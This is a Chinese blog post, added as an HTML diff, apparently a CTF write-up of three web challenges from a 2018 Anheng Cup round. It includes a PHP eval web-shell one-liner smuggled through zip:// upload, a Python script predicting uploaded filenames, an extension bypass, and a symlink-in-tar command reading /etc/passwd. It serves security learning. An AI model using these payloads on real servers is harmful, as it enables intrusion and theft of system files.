@@ -1,0 +1,1053 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="Bling_Dog">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Bling_Dog">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content>
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>安恒杯11月份web部分wp · Bling_dog&#39;s Blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="stylesheet" href="/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href="/assets/favicon.ico">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/">Bling_dog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">安恒杯11月份web部分wp</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href="/">Bling_dog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            安恒杯11月份web部分wp
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class="post-intro-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="CTF">CTF</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">1.1k</span>阅读时长: <span class="post-count reading-time">4 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2018/11/28</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <p>刚刚水完一波湖湘杯线下，被大佬们虐惨了，然后今天BCTF打不动啊，趁着空档，打打安恒杯吧，之前因为比赛时间冲突了没有打。记得自己最开始打ctf的时候，看什么都一片茫然，但是随着接触的时间越来越长，对web这个方向终于算是有了一个大体的认识。有一些题目虽然当时做不出来，但是看wp之后复现几次，也会越来越有一种下意识，希望以后越来越好！</p>
+<h1 id="image-up"><a href="#image-up" class="headerlink" title="image_up"></a>image_up</h1><p>这个题刚开始就叫登录，尝试弱口令密码admin/admin，发现登录进去有一个上传文件的功能，猜测应该是上传php然后上菜刀，但是上传了半天没绕过去。最后想了想能不能先读源码，发现源码可读。<br><img src="https://upload-images.jianshu.io/upload_images/11234137-35c03f9fb13c0dec.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-35c03f9fb13c0dec.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>base64解码得到源码如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $error = &quot;&quot;;</span><br><span class="line">    $exts = array(&quot;jpg&quot;,&quot;png&quot;,&quot;gif&quot;,&quot;jpeg&quot;);</span><br><span class="line">    if(!empty($_FILES[&quot;image&quot;]))</span><br><span class="line">    &#123;</span><br><span class="line">        $temp = explode(&quot;.&quot;, $_FILES[&quot;image&quot;][&quot;name&quot;]);</span><br><span class="line">        $extension = end($temp);</span><br><span class="line">        if((@$_upfileS[&quot;image&quot;][&quot;size&quot;] &lt; 102400))</span><br><span class="line">        &#123;</span><br><span class="line">            if(in_array($extension,$exts))&#123;</span><br><span class="line">              $path = &quot;uploads/&quot;.md5($temp[0].time()).&quot;.&quot;.$extension;</span><br><span class="line">              move_uploaded_file($_FILES[&quot;image&quot;][&quot;tmp_name&quot;], $path);</span><br><span class="line">              $error = &quot;上传成功!&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $error = &quot;上传失败！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#125;else&#123;</span><br><span class="line">          $error = &quot;文件过大，上传失败！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>很明显，这个题要求我们上传指定格式的文件，而且文件保存的名字是和时间有关系的，需要进行预测，这里贴一下大佬的预测脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">import time</span><br><span class="line">import requests</span><br><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">url = &quot;http://101.71.29.5:10007/&quot;</span><br><span class="line">def md5(str):</span><br><span class="line">	m = hashlib.md5()</span><br><span class="line">	m.update(str)</span><br><span class="line">	return m.hexdigest()</span><br><span class="line">files = &#123;</span><br><span class="line">	&quot;image&quot;:(&quot;blingdog.jpg&quot;,open(&quot;your.jpg&quot;,&quot;rb&quot;))</span><br><span class="line">&#125;</span><br><span class="line">t = int(time.time()+8*3600)</span><br><span class="line">requests.post(url=url+&quot;index.php?page=upload&quot;,files=files)</span><br><span class="line">for i in range(t-200,t+200):</span><br><span class="line">	path = &quot;uploads/&quot;+md5(&quot;blingdog&quot;+str(i))+&quot;.jpg&quot;</span><br><span class="line">	status = requests.get(url=url+path).status_code</span><br><span class="line">	if status ==200:</span><br><span class="line">		print path</span><br><span class="line">		break</span><br></pre></td></tr></table></figure></p>
+<p>对于上传的文件，我们用zip协议。即我们先写一个php文件，内容为 &lt;?php @eval($_POST[cxc]);，然后把这个php文件压缩成zip，将zip文件后缀改为jpg来进行上传。<br><img src="https://upload-images.jianshu.io/upload_images/11234137-55c00c6fab8d979d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-55c00c6fab8d979d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>然后zip协议访问一下试试<br><img src="https://upload-images.jianshu.io/upload_images/11234137-e3711f93ce25822e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-e3711f93ce25822e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>发现能够访问成功，我们接着上菜刀，拿下shell,得到flag</p>
+<h1 id="手速要快"><a href="#手速要快" class="headerlink" title="手速要快"></a>手速要快</h1><p>这个题刚开始有一个重定向问题，我们刚开始点击题目的时候就进行抓包，然后会发现得到了password。<br><img src="https://upload-images.jianshu.io/upload_images/11234137-9a057bc36e2540de.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-9a057bc36e2540de.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>对password进行md5破解，发现password是与时间的md5.也就是python库里的time.time()，但是我用python没写好脚本，可能是因为没有添加cookie的问题。偷了点懒，将时间预测20秒，然后那20秒就一直输入我们计算出时间的md5值，然后就进入了上传关。<br><img src="https://upload-images.jianshu.io/upload_images/11234137-621121ff497d7955.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-621121ff497d7955.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>然后发现不能上传php文件，但是php.jpg后缀可以被解析成php。<br><img src="https://upload-images.jianshu.io/upload_images/11234137-125ba72154ae7c40.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-125ba72154ae7c40.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br><img src="https://upload-images.jianshu.io/upload_images/11234137-5f78dd54151f3fda.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-5f78dd54151f3fda.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>然后就是常规操作，查看目录。发现flag在上一级<br><img src="https://upload-images.jianshu.io/upload_images/11234137-6aa07327ec27230a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-6aa07327ec27230a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>本来想着这个题上菜刀来着，但是菜刀连接不上，最后也没搞懂出了什么问题。</p>
+<h1 id="interesting"><a href="#interesting" class="headerlink" title="interesting"></a>interesting</h1><p>这个题开始没有什么思路，看了大佬的wp之后瞬间明白了。<br>首先根据题目的意思，非管理员用户只能上传jpg格式的文件，而管理员可以上传tar格式的文件。然后进行软连接，软连接的问题之前在HCTF中的一道题中有提到，在之前的一篇博客里面，<a href="https://chxing.xyz/2018/11/13/2018-hctf/" target="_blank" rel="noopener">https://chxing.xyz/2018/11/13/2018-hctf/</a><br>首先，我们点击找回密码，找回admin的密码。然后点击找回，出现下面的界面。服务器会发添加一个admin的session，session里面存储着token。<br><img src="https://upload-images.jianshu.io/upload_images/11234137-03fe1c5633387417.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-03fe1c5633387417.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>我们对这个session进行一下解密<br><img src="https://upload-images.jianshu.io/upload_images/11234137-3162906e3fb396b5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-3162906e3fb396b5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>关于软链接的问题，还有一篇文章挺好的<a href="http://www.vuln.cn/8132" target="_blank" rel="noopener">http://www.vuln.cn/8132</a><br>我们需要做的有两件事：</p>
+<ol>
+<li>ln -s /etc/passwd link.jpg (创建软连接文件)</li>
+<li>tar cvfp 1.tar link.jpg (将软链接文件打包到tar)<br><img src="https://upload-images.jianshu.io/upload_images/11234137-d480972639d83a43.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-d480972639d83a43.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>然后上传1.tar<br><img src="https://upload-images.jianshu.io/upload_images/11234137-b71b6821c558fe63.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-b71b6821c558fe63.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>这里我直接访问<a href="http://101.71.29.5:10010/download/link.jpg不能得到回显，不知道是什么问题。然后我把上传tar文件时候的包抓了一个，修改了请求才看到回显" target="_blank" rel="noopener">http://101.71.29.5:10010/download/link.jpg不能得到回显，不知道是什么问题。然后我把上传tar文件时候的包抓了一个，修改了请求才看到回显</a><br><img src="https://upload-images.jianshu.io/upload_images/11234137-83a7f8dc07c0c338.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-83a7f8dc07c0c338.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></li>
+</ol>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="http://yoursite.com">Bling_Dog</a>
+            </p><p>原文链接：<a href="http://yoursite.com/2018/11/28/安恒杯11月份web/">http://yoursite.com/2018/11/28/安恒杯11月份web/</a>
+            </p><p>发表日期：<a href="http://yoursite.com/2018/11/28/安恒杯11月份web/">November 28th 2018, 7:23:38 pm</a>
+            </p><p>更新日期：<a href="http://yoursite.com/2018/11/28/安恒杯11月份web/">November 28th 2018, 9:46:04 pm</a>
+            </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2018/12/22/安恒杯12月份部分wp/" title="安恒杯12月份部分wp">
+                    <div class="nextTitle">安恒杯12月份部分wp</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2018/11/21/CBC字节反转攻击问题/" title="CBC反转攻击问题">
+                    <div class="prevTitle">CBC反转攻击问题</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:563667866@qq.com" class="iconfont-archer email" title="email"></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/fi3ework" class="iconfont-archer github" target="_blank" title="github"></a>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer wechat" title="wechat">
+                  
+                  <img class="profile-qr" src="/assets/example_qr.png">
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#image-up"><span class="toc-number">1.</span> <span class="toc-text">image_up</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#手速要快"><span class="toc-number">2.</span> <span class="toc-text">手速要快</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#interesting"><span class="toc-number">3.</span> <span class="toc-text">interesting</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 22
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/19</span><a class="archive-post-title" href="/2019/05/19/padding oracle/">padding oracle学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/17</span><a class="archive-post-title" href="/2019/05/17/DataConDns1/">360Datacon大数据安全比赛DNS方向一WP</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/27</span><a class="archive-post-title" href="/2019/04/27/2019国赛部分题目WP---NEX的小老妹/">2019国赛部分题目wp-by NEX</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/18</span><a class="archive-post-title" href="/2019/04/18/2019DDctfWP/">2019DDctfWP</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/28</span><a class="archive-post-title" href="/2019/03/28/安恒杯西湖论剑/">安恒杯西湖论剑wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/12</span><a class="archive-post-title" href="/2019/02/12/hgame2019/">hgame-2019 wp</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/22</span><a class="archive-post-title" href="/2018/12/22/安恒杯12月份部分wp/">安恒杯12月份部分wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/28</span><a class="archive-post-title" href="/2018/11/28/安恒杯11月份web/">安恒杯11月份web部分wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/21</span><a class="archive-post-title" href="/2018/11/21/CBC字节反转攻击问题/">CBC反转攻击问题</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/18</span><a class="archive-post-title" href="/2018/11/18/湖湘杯/">湖湘杯部分题目wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/17</span><a class="archive-post-title" href="/2018/11/17/2018高校网络安全信息安全管理运维挑战赛/">2018高校网络信息安全管理运维挑战赛wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/13</span><a class="archive-post-title" href="/2018/11/13/2018-hctf/">2018-hctf-wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/07</span><a class="archive-post-title" href="/2018/11/07/uploads/">uploads-labs总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
